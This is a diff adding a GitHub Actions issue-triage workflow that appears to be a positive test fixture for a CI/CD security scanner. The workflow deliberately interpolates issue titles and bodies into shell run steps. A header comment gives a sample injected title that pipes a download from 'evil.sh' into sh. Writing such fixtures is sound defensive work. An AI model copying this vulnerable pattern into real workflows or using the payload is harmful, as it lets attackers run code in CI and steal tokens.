@@ -1,0 +1,26 @@
+# corpus: positive
+# models: script injection -- an issue title (attacker-controlled, e.g.
+#   `"; curl evil.sh | sh #`) is template-expanded straight into a run script.
+# expect: cicd-sec-4-ppe-shell-injection
+name: Triage issues
+
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  issues: write
+
+jobs:
+  triage:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Echo title
+        run: |
+          echo "New issue: ${{ github.event.issue.title }}"
+          echo "${{ github.event.issue.body }}" > body.txt
+      - name: Label
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh issue edit ${{ github.event.issue.number }} --add-label triage -R ${{ github.repository }}
